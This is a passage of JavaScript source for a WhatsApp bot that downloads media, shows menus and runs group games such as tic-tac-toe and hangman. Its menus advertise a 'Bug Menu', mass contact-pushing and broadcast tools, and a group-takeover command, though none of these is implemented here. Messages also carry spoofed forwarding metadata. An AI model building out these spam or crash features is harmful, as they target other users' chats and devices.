        `Try downloading manually from:\n${actualUrl}`;
      return mzazireply(msg);
    }

    // ── Send video ──
    await mzazi.sendMessage(
      sender,
      {
        video: videoBuffer,
        caption:
          `🎬 *${title}*\n` +
          `⏱️ Duration: ${duration || 'N/A'}\n` +
          `📹 Quality: ${quality || 'Auto'}\n` +
          `📦 Size: ${fileSizeMB} MB\n` +
          `⚡ ${botName}`,
        mimetype: 'video/mp4',
        fileName: `${title}.mp4`,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363425539800408@newsletter',
            newsletterName: botName.toUpperCase(),
            serverMessageId: 143,
          },
        },
      },
      { quoted: m }
    );

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });

    // Clean up after 5 minutes
    setTimeout(() => {
      if (global.sxVideoData) global.sxVideoData.delete(videoId);
    }, 300000);

  } catch (err) {
    logger.error('SX Download error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ ${err.message || 'Download failed'}`);
  }
  break;
}
//=====================================//

case 'sxinfo': {
  if (!text) {
    return mzazireply('📋 Usage: .sxinfo <video_id>');
  }
  const videoId = text.trim();
  if (!global.sxVideoData) global.sxVideoData = new Map();
  const video = global.sxVideoData.get(videoId);
  if (!video) return mzazireply('❌ Invalid video ID.');
  const { title, duration, views, quality, url } = video;
  const msg =
    `📋 *Video Details*\n\n` +
    `📹 *Title:* ${title}\n` +
    `⏱️ *Duration:* ${duration || 'N/A'}\n` +
    `👁️ *Views:* ${views || 'N/A'}\n` +
    `📹 *Quality:* ${quality || 'Auto'}\n` +
    `🔗 *URL:* ${url || 'Not available'}`;
  return mzazireply(msg);
}
//=====================================//

case 'play3':
//=====================================//

case 'ytplay': {
  if (!text) {
    return mzazireply(
      `🎵 *YouTube Play3*\n\n` +
      `Usage: .play3 <song name>\n` +
      `Example: .play3 Faded Alan Walker`
    );
  }

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    const query = encodeURIComponent(text.trim());
    // Try multiple APIs in order
    const apis = [
      `https://api.drexapp.space/downloader/ytplayv2?q=${query}`,
      `https://api.dreaded.site/api/ytplay?q=${query}`,
      `https://api.nexoracle.com/ytdl?q=${query}`,
    ];

    let result = null;
    let usedApi = '';
    for (const api of apis) {
      try {
        const res = await axios.get(api, { timeout: 15000 });
        if (res.data?.status && res.data?.result) {
          result = res.data.result;
          usedApi = api;
          break;
        }
      } catch {}
    }

    if (!result) throw new Error('All APIs failed');

    const { title, thumbnail, downloadUrl, duration, views } = result;

    // Generate session
    const sessionId = `p3_${Date.now()}_${senderNum}`;
    if (!global.p3Data) global.p3Data = new Map();
    global.p3Data.set(sessionId, { title, thumbnail, downloadUrl, duration, views });

    // Build carousel card
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    let preparedImage = null;
    if (thumbnail) {
      try {
        const { data: imgBuf } = await axios.get(thumbnail, { responseType: 'arraybuffer', timeout: 8000 });
        const imgContent = await generateWAMessageContent(
          { image: Buffer.from(imgBuf) },
          { upload: mzazi.waUploadToServer }
        );
        if (imgContent?.imageMessage) preparedImage = imgContent.imageMessage;
      } catch {}
    }

    const card = {
      header: {
        title: title.slice(0, 40),
        hasMediaAttachment: !!preparedImage,
        ...(preparedImage ? { imageMessage: preparedImage } : {}),
      },
      body: {
        text: `🎵 *${title}*\n⏱️ ${duration || 'N/A'}\n👁️ ${views || 'N/A'}\n\nSelect format:`,
      },
      footer: { text: `© ${botName} • Expires 3 min` },
      nativeFlowMessage: {
        buttons: [
          { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🎵 Audio', id: `.p3dl ${sessionId} audio` }) },
          { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '📄 File (Document)', id: `.p3dl ${sessionId} file` }) },
          { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🎬 Video MP4', id: `.p3dl ${sessionId} video` }) },
        ],
      },
    };

    const interactiveMsg = generateWAMessageFromContent(
      sender,
      {
        interactiveMessage: {
          body: { text: `🎧 *${botName.toUpperCase()} YOUTUBE DOWNLOADER*` },
          footer: { text: `🔍 "${text}"` },
          carouselMessage: { cards: [card] },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363425539800408@newsletter',
              newsletterName: botName.toUpperCase(),
              serverMessageId: 143,
            },
          },
        },
      },
      {}
    );

    await mzazi.relayMessage(sender, interactiveMsg.message, { messageId: interactiveMsg.key.id });
    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });

    setTimeout(() => { if (global.p3Data) global.p3Data.delete(sessionId); }, 300000);

  } catch (err) {
    logger.error('Play3 error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ ${err.message}`);
  }
  break;
}

//=====================================//

case 'p3dl': {
  const [sessionId, format] = args;
  if (!sessionId || !format) return mzazireply('❌ Invalid request.');
  if (!global.p3Data) global.p3Data = new Map();
  const data = global.p3Data.get(sessionId);
  if (!data) return mzazireply('❌ Session expired. Search again with .play3');

  try {
    await mzazi.sendMessage(sender, { react: { text: '⏳', key: m.key } });

    let url = data.downloadUrl;
    let fileName = data.title;

    // If format is video, we need to get a video URL – we'll use a different API endpoint
    if (format === 'video') {
      // Try to get video format from a separate API or use ytdl-core
      try {
        const ytdl = require('ytdl-core');
        const info = await ytdl.getInfo(url, { requestOptions: { headers: { 'User-Agent': 'Mozilla/5.0' } } });
        const videoFormat = ytdl.chooseFormat(info.formats, { quality: 'highest', filter: 'audioandvideo' });
        url = videoFormat.url;
      } catch {
        // Fallback: try a video API
        const vidApi = `https://api.dreaded.site/api/ytmp4?url=${encodeURIComponent(data.downloadUrl)}`;
        const res = await axios.get(vidApi);
        url = res.data?.result?.downloadUrl || data.downloadUrl;
      }
    }

    // Download the file
    const fileRes = await axios.get(url, {
      responseType: 'arraybuffer',
      timeout: 60000,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      maxRedirects: 5,
    });
    const buffer = Buffer.from(fileRes.data);
    const size = (buffer.length / (1024 * 1024)).toFixed(1);

    const caption = `📥 *${fileName}*\n📦 Size: ${size} MB\n⚡ ${botName}`;

    if (format === 'audio') {
      await mzazi.sendMessage(sender, { audio: buffer, mimetype: 'audio/mpeg', fileName: `${fileName}.mp3`, caption }, { quoted: m });
    } else if (format === 'file') {
      await mzazi.sendMessage(sender, { document: buffer, mimetype: 'audio/mpeg', fileName: `${fileName}.mp3`, caption }, { quoted: m });
    } else if (format === 'video') {
      await mzazi.sendMessage(sender, { video: buffer, mimetype: 'video/mp4', fileName: `${fileName}.mp4`, caption }, { quoted: m });
    } else {
      return mzazireply('❌ Invalid format.');
    }

    await mzazi.sendMessage(sender, { react: { text: '✅', key: m.key } });
    global.p3Data.delete(sessionId);
  } catch (err) {
    logger.error('p3dl error:', err);
    await mzazi.sendMessage(sender, { react: { text: '❌', key: m.key } });
    mzazireply(`❌ Download failed: ${err.message}`);
  }
  break;
}
//=====================================//

case "mmmm": {
 const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
 const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
 const day = days[currentDate.getDay()];
 const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
 const time = currentDate.toLocaleTimeString("id-ID");

 let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃      🤖 MZAZI TECH PRIVATE BOT PRO
┃   Smart • Fast • Secure • Reliable
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

『 ⚙️ BOT INFORMATION 』

✦ Bot Name     : ${botName.toUpperCase()}
✦ Version      : ${global.versi}
✦ Status       : ${mzazi.public ? "🌍 PUBLIC MODE" : "🔒 SELF MODE"}
✦ Time         : ${time}
✦ Features     : 1000+
✦ Platform     : WhatsApp
✦ Language     : JavaScript
✦ Prefix       : Multi Prefix
✦ Developer    : MZAZI TECH INC
✦ Website      : api.mzazi.shop
✦ Interface    : Interactive Buttons

━━━━━━━━━━━━━━━━━━━━━━

『 👤 USER INFORMATION 』

👤 Name         : ${name}
⭐ Account      : ${isOwner ? "👑 Owner" : isPremium ? "💎 Premium User" : "🆓 Free User"}

━━━━━━━━━━━━━━━━━━━━━━

💡 ${botName.toUpperCase()} is an advanced WhatsApp bot built for speed, automation, security, AI tools, media downloads, and professional group management.

⚠️ Please use this bot responsibly and follow WhatsApp's Terms of Service.

━━━━━━━━━━━━━━━━━━━━━━

✨ Thank you for choosing MZAZI TECH.
Your trust and support inspire us to build better features every day.

⬇️ Click the button below to view all available commands and features.

╭━━━━━━━━━━━━━━━━━━━━━━╮
┃        © MZAZI TECH INC 🌹
┃     Innovation • Automation • Excellence
╰━━━━━━━━━━━━━━━━━━━━━━╯
`
 await mzazi.sendMessage(sender, {
 image: fs.readFileSync('./media/menu.jpg'),// Ganti ke gambar
 caption: teks,
 footer: `© 𝐌𝐙𝐀𝐙𝐈 𝐓𝐄𝐂𝐇 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐁𝚯𝐓 𝐏𝐑𝚯 2025 - 2026`,
 buttons: [
 {
 buttonId: `.allmenu`,
 buttonText: { displayText: 'ALL MENU' },
 type: 1
 },
 {
 buttonId: `.bugmenu`,
 buttonText: { displayText: 'GROUP MENU' },
 type: 1
 },
 {
 buttonId: `.dev`,
 buttonText: { displayText: '𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫👑' },
 type: 1
 }
 ],
 headerType: 4,
 contextInfo: {
 mentionedJid: [sender]
 }
 }); // ✅ Removed { quoted: m }
}
break

//=====================================//

case "allmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");
    
    let name = m.pushName || "User"; // ✅ Tambahkan ini
 let teks = `${botName.toUpperCase()}
─ Advanced WhatsApp Bot for automation, AI tools, group management, and productivity. Use responsibly.

BOT INFORMATION
☇ Bot Name : ${botName.toUpperCase()}
☇ Version : ${version}
☇ Mode : ${mzazi.public ? "🌍 Public" : "🔒 Self"}
☇ Time : ${time}
☇ Total Features : 700+
☇ Developer : MZAZI TECH INC
☇ Website : api.mzazi.shop
☇ Appearance : Button
☇ Language : JavaScript
☇ Prefix : Multi

USER INFORMATION
👤 Name : ${name}
👑 Status : ${isOwner ? "Owner" : isPaid ? "Premium User" : "Free User"}


┏━━━━━⫷ NEW MENU ⫸━━━
┃➵ channelmenu ( menu new channel )
┃➵ autoblock
┃➵ backup
┃➵ gconly
┃➵ getppgrup
┃➵ getpp
┃➵ pushkontak
┃➵ pushkontakid
┃➵ cekidgrup
┃➵ savekontak
┃➵ savekontakid
┃➵ setjedapush
┃➵ jpmchvideo (Video)
┃➵ jpmchvip (BuatPtJs)
┃➵ addptjs (PartnerJs)
┃➵ delptjs (PartnerJs)
┃➵ addownjs (OwnerJs)
┃➵ delownjs (OwnerJs)
┃➵ setdelayjpmch (seting delay)
┃➵ setbotjpmch (seting on/off)
┃➵ autojpmch
┃➵ addteks
┃➵ delteks
┃➵ listteks
┃➵ statusjpmch
┃➵ welcome
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ OWNER MENU ⫸━━━
┃➵ autopromosi
┃➵ autoread
┃➵ autoreadsw
┃➵ autotyping
┃➵ addowner
┃➵ addownerall
┃➵ listowner
┃➵ delowner
┃➵ delownerall
┃➵ self/public
┃➵ block
┃➵ unblok
┃➵ setbiobot
┃➵ setnamabot
┃➵ clearsession
┃➵ restart
┃➵ addcase
┃➵ delcase
┃➵ getcase
┃➵ spekvps
┃➵ uptime
┃➵ totalfitur
┃➵ autoblock
┃➵ backup
┃➵ gconly
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ PANEL MENU V1 ⫸━━━
┃➵ 1gb
┃➵ 2gb
┃➵ 3gb
┃➵ 4gb
┃➵ 5gb
┃➵ 6gb
┃➵ 7gb
┃➵ 8gb
┃➵ 9gb
┃➵ 10gb
┃➵ unlimited
┃➵ createserver
┃➵ cadp
┃➵ cadmin
┃➵ delpanel
┃➵ delallserver
┃➵ delalluser
┃➵ deladmin
┃➵ delalladmin
┃➵ listpanel
┃➵ listadmin
┃➵ updomain
┃➵ upapikey
┃➵ upcapikey
┃➵ addakses
┃➵ addreseller
┃➵ delakses
┃➵ delreseller
┃➵ listreseller
┃➵ resetreseller
┃➵ totalpanel
┃➵ totaladmin
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ GROUP MENU ⫸━━━
┃➵ add
┃➵ kick
┃➵ close
┃➵ open
┃➵ hidetag
┃➵ kudetagc
┃➵ leave
┃➵ tagall
┃➵ promote
┃➵ demote
┃➵ resetlinkgc
┃➵ getdeskgc
┃➵ totalmember
┃➵ linkgc
┃➵ bljpm
┃➵ delbljpm
┃➵ listdaftarjpm
┃➵ listonline
┃➵ listgrup
┃➵ joingrup
┃➵ getppgrup
┃➵ getpp
┃➵ buatgc
┃➵ antilink
┃➵ welcome
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ TOOLS MENU ⫸━━━
┃➵ brat
┃➵ tourl
┃➵ tourl2
┃➵ berita
┃➵ ssweb
┃➵ translate
┃➵ infogempa
┃➵ infocuaca
┃➵ wallpaper
┃➵ ioschat
┃➵ shortlink
┃➵ shortlink-dl
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ STORE MENU ⫸━━━
┃➵ addrespon
┃➵ delrespon
┃➵ listrespon
┃➵ done
┃➵ proses
┃➵ jpm (Teks)
┃➵ gas2 (Foto)
┃➵ jpm3 (Video)
┃➵ jpmtesti
┃➵ jpmslide
┃➵ jpmslideht
┃➵ sendtesti
┃➵ payment
┃➵ pushkontak
┃➵ pushkontakid
┃➵ cekidgrup
┃➵ savekontak
┃➵ savekontakid
┃➵ setjedapush
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ CHANNEL MENU ⫸━━━
┃➵ jpmchteks (Teks)
┃➵ jpmchbutton (Button)
┃➵ jpmchfoto (Foto)
┃➵ jpmchvideo (Video)
┃➵ setdelayjpmch (seting delay)
┃➵ setbotjpmch (seting on/off)
┃➵ autojpmch
┃➵ addteks
┃➵ delteks
┃➵ listteks
┃➵ statusjpmch
┃➵ jpmchjumlah (Jumlah)
┃➵ jpmchvip (BuatPtJs)
┃➵ addptjs (PartnerJs)
┃➵ delptjs (PartnerJs)
┃➵ addownjs (OwnerJs)
┃➵ delownjs (OwnerJs)
┃➵ addid (Channel)
┃➵ addallid (Semua Id Channel)
┃➵ delid (Channel)
┃➵ delallid (Semua Id Channel)
┃➵ listid (Channel)
┃➵ seturlsatu (setjpmchbutton)
┃➵ seturldua (setjpmchbutton)
┃➵ joinchannel
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ PAYMENT MENU ⫸━━━
┃➵ dana
┃➵ ovo
┃➵ gopay
┃➵ qris
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ OTHER MENU ⫸━━━
┃➵ cekidch
┃➵ cekidgc
┃➵ reactch
┃➵ rvo
┃➵ qc
┃➵ stiker
┃➵ stikerwm
┗━━━━━━━━━━━━⭓

┏━━━━━⫷ SEARCH MENU ⫸━━━
┃➵ tiktok
┃➵ tiktokmp3
┗━━━━━━━━━━━━⭓
 *©𝑴͋͢͜𝒁𝑨̶͠𝒁𝑰͢͡ 𝑻̶𝑬̟𝑪𝑯̶͎̟̽ 𝑰𝑵𝑪🌹*
`

    await mzazi.sendMessage(sender, { // ✅ Changed m.chat to sender
        image: fs.readFileSync('./media/reply.jpg'), // GANTI ke gambar
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙍𝙖𝙯𝙖𝙈𝙤𝙙𝙨',
                                rows: [
{ "title": "New Menu 🆕", "id": ".newmenu", "description": "View the latest menu features added to the system." },
{ "title": "Cpanel Menu v1 ⚙️", "id": ".panelmenuv1", "description": "Access Cpanel Menu Version 1." },
{ "title": "Cpanel Menu v2 ⚙️", "id": ".panelmenuv2", "description": "Access Cpanel Menu Version 2." },
{ "title": "Search Menu 🔎", "id": ".searchmenu", "description": "Useful search tools and lookup features." },
{ "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Collection of useful utility tools and features." },
{ "title": "Other Menu 📂", "id": ".othermenu", "description": "Additional features with various helpful functions." },
{ "title": "Store Menu 🏪", "id": ".storemenu", "description": "Browse and purchase digital products and services." },
{ "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Manage payments, transactions, and financial methods." },
{ "title": "Group Menu 👥", "id": ".groupmenu", "description": "Manage and interact with groups and communities." },
{ "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Access WhatsApp Channel management features." },
{ "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Exclusive owner controls and system management tools." },
{ "title": "Help ❓", "id": ".help", "description": "Get help and learn how to use the bot features." }
]
                            }
                        ]
                    })
                }
            },
            { 
                buttonId: '.bugmenu', 
                buttonText: { displayText: '𝐁𝐮𝐠 𝐌𝐞𝐧𝐮☠️🩸' }, 
                type: 1 
            },
            { 
                buttonId: '.2', 
                buttonText: { displayText: '📃 𝐍𝐨 𝐁𝐮𝐭𝐭𝐨𝐧 𝐌𝐞𝐧𝐮' }, 
                type: 1 
            },
            { 
                buttonId: '.owner', 
                buttonText: { displayText: '👑 𝐎𝐰𝐧𝐞𝐫' }, 
                type: 1 
            }
        ],
        headerType: 4, // 4 tetap bisa dipakai meski pakai image
        viewOnce: true,
    }); // ✅ Removed { quoted: qtext2 }
}
break;





     
      
      
      
      
//=====================================//


//=====================================//

// ════════════════════════════════════════════════
//   GROUP FUN & GAMES — TICTACTOE, HANGMAN,
//   NUMBERGUESS, SCRAMBLE, QUIZ, FASTMATH, etc.
// ════════════════════════════════════════════════

// ── Global game state stores ──────────────────────
if (!global.tttGames)      global.tttGames      = new Map(); // Tic-Tac-Toe
if (!global.hangmanGames)  global.hangmanGames  = new Map(); // Hangman
if (!global.guessGames)    global.guessGames    = new Map(); // Number Guess
if (!global.scrambleGames) global.scrambleGames = new Map(); // Word Scramble
if (!global.quizGames)     global.quizGames     = new Map(); // Group Quiz
if (!global.mathGames)     global.mathGames     = new Map(); // Fast Math
if (!global.rpsGames)      global.rpsGames      = new Map(); // Rock Paper Scissors
if (!global.connectGames)  global.connectGames  = new Map(); // Connect 4
if (!global.truthDareGames) global.truthDareGames = new Map(); // Truth or Dare turns
if (!global.wordchainGames) global.wordchainGames = new Map(); // Word Chain

//=====================================//

// ████████████████████████████████████████
//   TIC-TAC-TOE
//   .ttt @user  — challenge someone
//   .ttt 1-9    — make a move
//   .endttt     — forfeit
// ████████████████████████████████████████
case "ttt":
case "tictactoe": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const tttId = sender; // group jid

  // ── Start new game ──
  const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  if (mentioned.length > 0 || args[0]?.includes("@")) {
    const opponent = mentioned[0];
    if (!opponent) return mzazireply(`❌ Mention a player!\nExample: ${prefix}ttt @player`);
    if (opponent === msgSender) return mzazireply("❌ You can't challenge yourself!");

    if (global.tttGames.has(tttId)) return mzazireply("❌ A game is already running in this group! Use *endttt* to stop it.");

    global.tttGames.set(tttId, {
      board: [" ", " ", " ", " ", " ", " ", " ", " ", " "],
      players: [msgSender, opponent],
      symbols: ["❌", "⭕"],
      turn: 0,
      startedAt: Date.now()
    });

    const p1 = `@${jidToNumber(msgSender)}`;
    const p2 = `@${jidToNumber(opponent)}`;

    const board = global.tttGames.get(tttId).board;
    const drawBoard = (b) =>
      `┌───┬───┬───┐\n│ ${b[0]} │ ${b[1]} │ ${b[2]} │\n├───┼───┼───┤\n│ ${b[3]} │ ${b[4]} │ ${b[5]} │\n├───┼───┼───┤\n│ ${b[6]} │ ${b[7]} │ ${b[8]} │\n└───┴───┴───┘`;

    return mzazi.sendMessage(sender, {
      text: `🎮 *TIC-TAC-TOE STARTED!*\n\n${p1} ❌  vs  ⭕ ${p2}\n\nPositions:\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣\n\n${drawBoard(["1","2","3","4","5","6","7","8","9"])}\n\n${p1}'s turn! Type *${prefix}ttt <1-9>* to play.`,
      mentions: [msgSender, opponent]
    }, { quoted: m });
  }

  // ── Make a move ──
  const game = global.tttGames.get(tttId);
  if (!game) return mzazireply(`❌ No active Tic-Tac-Toe game. Start one with *${prefix}ttt @player*`);

  const pos = parseInt(args[0]);
  if (isNaN(pos) || pos < 1 || pos > 9) return mzazireply("❌ Choose a position from 1 to 9.");

  const currentPlayer = game.players[game.turn % 2];
  if (msgSender !== currentPlayer) return mzazireply(`⏳ It's not your turn!`);

  const idx = pos - 1;
  if (game.board[idx] !== " ") return mzazireply("❌ That spot is taken! Choose another.");

  game.board[idx] = game.symbols[game.turn % 2];
  game.turn++;

  const drawBoard = (b) =>
    `┌───┬───┬───┐\n│ ${b[0]} │ ${b[1]} │ ${b[2]} │\n├───┼───┼───┤\n│ ${b[3]} │ ${b[4]} │ ${b[5]} │\n├───┼───┼───┤\n│ ${b[6]} │ ${b[7]} │ ${b[8]} │\n└───┴───┴───┘`;

  const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  const checkWin = (b, sym) => wins.some(([a,c,d]) => b[a] === sym && b[c] === sym && b[d] === sym);
  const isDraw = (b) => b.every(c => c !== " ");

  const sym = game.symbols[(game.turn - 1) % 2];
  const boardStr = drawBoard(game.board);

  if (checkWin(game.board, sym)) {
    global.tttGames.delete(tttId);
    return mzazi.sendMessage(sender, {
      text: `🎮 *TIC-TAC-TOE*\n\n${boardStr}\n\n🏆 @${jidToNumber(currentPlayer)} WINS! Congratulations! 🎉`,
      mentions: [currentPlayer]
    }, { quoted: m });
  }

  if (isDraw(game.board)) {
    global.tttGames.delete(tttId);
    return mzazireply(`🎮 *TIC-TAC-TOE*\n\n${boardStr}\n\n🤝 It's a DRAW! Well played!`);
  }

  const nextPlayer = game.players[game.turn % 2];
  const nextSym = game.symbols[game.turn % 2];
  return mzazi.sendMessage(sender, {
    text: `🎮 *TIC-TAC-TOE*\n\n${boardStr}\n\n${nextSym} @${jidToNumber(nextPlayer)}'s turn! Type *${prefix}ttt <1-9>*`,
    mentions: [nextPlayer]
  }, { quoted: m });
  break;
}

//=====================================//

case "endttt":
case "stopttt": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.tttGames.has(sender)) return mzazireply("❌ No Tic-Tac-Toe game is running.");
  const game = global.tttGames.get(sender);
  if (msgSender !== game.players[0] && msgSender !== game.players[1] && !isAdmin && !isOwner)
    return mzazireply("❌ Only players or admins can end the game.");
  global.tttGames.delete(sender);
  mzazireply("🛑 Tic-Tac-Toe game ended.");
  break;
}

//=====================================//

// ████████████████████████████████████████
//   HANGMAN
//   .hangman        — start a game
//   .hangman a      — guess a letter
//   .endhangman     — stop game
// ████████████████████████████████████████
case "hangman": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const hmId = sender;

  const hangStages = [
    "```\n  +---+\n      |\n      |\n      |\n      |\n=========```",
    "```\n  +---+\n  O   |\n      |\n      |\n      |\n=========```",
    "```\n  +---+\n  O   |\n  |   |\n      |\n      |\n=========```",
    "```\n  +---+\n  O   |\n /|   |\n      |\n      |\n=========```",
    "```\n  +---+\n  O   |\n /|\\  |\n      |\n      |\n=========```",
    "```\n  +---+\n  O   |\n /|\\  |\n /    |\n      |\n=========```",
    "```\n  +---+\n  O   |\n /|\\  |\n / \\  |\n      |\n=========```"
  ];

  const wordList = [
    "javascript","python","computer","keyboard","internet","database","algorithm","developer",
    "programming","function","variable","elephant","butterfly","chocolate","adventure","friendship",
    "mountain","universe","discovery","knowledge","beautiful","wonderful","fantastic","excellent",
    "whatsapp","instagram","youtube","facebook","telegram","microphone","headphones","bluetooth",
    "technology","artificial","intelligence","education","happiness","celebrate","champion",
    "rainbow","sunshine","horizon","treasure","paradise","creative","universe","wonderful"
  ];

  // ── Start new game (no args) ──
  if (!args[0] || args[0].length > 1) {
    if (global.hangmanGames.has(hmId)) return mzazireply(`❌ A Hangman game is already running! Guess a letter with *${prefix}hangman <letter>* or stop with *${prefix}endhangman*`);

    const word = wordList[Math.floor(Math.random() * wordList.length)].toUpperCase();
    global.hangmanGames.set(hmId, {
      word,
      guessed: [],
      wrong: 0,
      maxWrong: 6,
      startedBy: msgSender,
      startedAt: Date.now()
    });

    const display = word.split("").map(l => "_ ").join("").trim();
    return mzazireply(`🎮 *HANGMAN STARTED!*\n\n${hangStages[0]}\n\n📝 Word: ${display}\n📏 Length: ${word.length} letters\n\nGuess a letter: *${prefix}hangman <letter>*\nStop: *${prefix}endhangman*`);
  }

  // ── Guess a letter ──
  const game = global.hangmanGames.get(hmId);
  if (!game) return mzazireply(`❌ No active Hangman game. Start one with *${prefix}hangman*`);

  const letter = args[0].toUpperCase();
  if (!/^[A-Z]$/.test(letter)) return mzazireply("❌ Please guess a single letter (A–Z).");
  if (game.guessed.includes(letter)) return mzazireply(`❌ *${letter}* was already guessed! Try another.`);

  game.guessed.push(letter);

  if (!game.word.includes(letter)) {
    game.wrong++;
  }

  const display = game.word.split("").map(l => game.guessed.includes(l) ? l : "_").join(" ");
  const wrongLetters = game.guessed.filter(l => !game.word.includes(l)).join(", ") || "None";

  // ── Win ──
  if (!display.includes("_")) {
    global.hangmanGames.delete(hmId);
    return mzazi.sendMessage(sender, {
      text: `🎮 *HANGMAN*\n\n${hangStages[game.wrong]}\n\n✅ The word was: *${game.word}*\n\n🏆 @${jidToNumber(msgSender)} guessed it! 🎉`,
      mentions: [msgSender]
    }, { quoted: m });
  }

  // ── Lose ──
  if (game.wrong >= game.maxWrong) {
    global.hangmanGames.delete(hmId);
    return mzazireply(`🎮 *HANGMAN*\n\n${hangStages[6]}\n\n💀 GAME OVER!\nThe word was: *${game.word}*\nBetter luck next time!`);
  }

  mzazireply(`🎮 *HANGMAN*\n\n${hangStages[game.wrong]}\n\n📝 Word: ${display}\n❌ Wrong: ${game.wrong}/${game.maxWrong}\n🔤 Guessed: ${game.guessed.join(", ")}\n⚠️ Wrong letters: ${wrongLetters}\n\nGuess a letter: *${prefix}hangman <letter>*`);
  break;
}

//=====================================//

case "endhangman":
case "stophangman": {
  if (!isGroup) return mzazireply("❌ Group only!");
  if (!global.hangmanGames.has(sender)) return mzazireply("❌ No Hangman game is running.");
  const hmg = global.hangmanGames.get(sender);
  global.hangmanGames.delete(sender);
  mzazireply(`🛑 Hangman ended. The word was: *${hmg.word}*`);
  break;
}

//=====================================//

// ████████████████████████████████████████
//   NUMBER GUESS
//   .numguess       — start game
//   .numguess 42    — make a guess
//   .endguess       — stop game
// ████████████████████████████████████████
case "numguess":
case "numberguess":
case "guess": {
  if (!isGroup) return mzazireply("❌ Group only!");

  const ngId = sender;

  if (!args[0]) {
    // Start new game
    if (global.guessGames.has(ngId)) return mzazireply(`❌ A Number Guess game is running! Use *${prefix}numguess <number>* or *${prefix}endguess* to stop.`);
    const secret = Math.floor(Math.random() * 100) + 1;
    const maxTries = 7;
    global.guessGames.set(ngId, { secret, tries: 0, maxTries, startedBy: msgSender, guessers: {} });
    return mzazireply(`🎮 *NUMBER GUESS GAME!*\n\nI'm thinking of a number between *1 and 100*.\nYou have *${maxTries} tries* to guess it!\n\nType: *${prefix}numguess <number>*\nStop: *${prefix}endguess*`);
  }

  const game = global.guessGames.get(ngId);
  if (!game) return mzazireply(`❌ No active Number Guess game. Start one with *${prefix}numguess*`);

  const guess = parseInt(args[0]);
  if (isNaN(guess) || guess < 1 || guess > 100) return mzazireply("❌ Please guess a number between *1* and *100*.");

  game.tries++;
  const name = m.pushName || jidToNumber(msgSender);

  if (guess === game.secret) {
    global.guessGames.delete(ngId);
    return mzazi.sendMessage(sender, {
      text: `🎮 *NUMBER GUESS*\n\n🏆 @${jidToNumber(msgSender)} got it!\nThe number was *${game.secret}*!\nGuessed in *${game.tries}* tries! 🎉`,
      mentions: [msgSender]
    }, { quoted: m });
  }

  if (game.tries >= game.maxTries) {
    global.guessGames.delete(ngId);
    return mzazireply(`🎮 *NUMBER GUESS*\n\n💀 GAME OVER! Out of tries.\nThe number was *${game.secret}*. Better luck next time!`);
  }

  const hint = guess < game.secret ? "📈 Too LOW! Go higher." : "📉 Too HIGH! Go lower.";
  const triesLeft = game.maxTries - game.tries;
  mzazireply(`🎮 *NUMBER GUESS*\n\n${hint}\nYour guess: *${guess}*\nTries left: *${triesLeft}/${game.maxTries}*\n\nType: *${prefix}numguess <number>*`);
  break;
}

//=====================================//

case "endguess":
case "stopguess": {
  if (!isGroup) return mzazireply("❌ Group only!");
